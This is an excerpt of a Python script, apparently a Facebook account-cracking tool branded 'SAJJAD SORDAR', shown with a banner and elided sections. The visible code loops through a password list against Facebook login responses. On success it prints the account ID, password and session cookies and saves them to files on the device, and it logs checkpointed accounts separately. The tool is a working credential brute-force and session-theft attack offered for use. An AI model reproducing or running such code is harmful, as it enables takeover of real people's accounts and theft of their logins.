...
╚══════╝╚═╝  ╚═╝ ╚════╝  ╚════╝ ╚═╝  ╚═╝╚═════╝ 
                                                ...
                                                "bmmmdPY
{warna}--------------------------------------------{B}
 Owner    : {C}SAJJAD SORDAR{B}
 Facebook : SAJJAD SORDAR
...
def MR_DIPTO():
    clear()
    os.system('https://www.facebook.com/profile.php?id=100088316394289&mibextid=ZbWKwL')
        ...
        for pas in passlist:
            ...
            if 'session_key' in reqx:
                ...
                if str(uid) in oks:
                    ...
                    print('\r\r \033[1;32m[SAJJAD SORDAR-OK] '+str(uid)+' | '+pas+'\033[1;37m')
                    coki=";".join(i["name"]+"="+i["value"] for i in reqx["session_cookies"])
                    print('\033[1;32m [COOKIES] '+coki)
                    open('/sdcard/SAJJAD SORDAR-OK.txt','a').write(str(uid)+' | '+pas+'\n')
                    oks.append(str(uid))
                    break
            elif 'www.facebook.com' in reqx['error_msg']:
                print('\r\r \033[1;30m[SAJJAD SORDAR-CP] '+ids+' | '+pas+'\033[1;37m')
                open('/sdcard/SAJJAD SORDAR-CP.txt','a').write(ids+'|'+pas+'\n')
                cps.append(ids)
                break
            else:
                continue
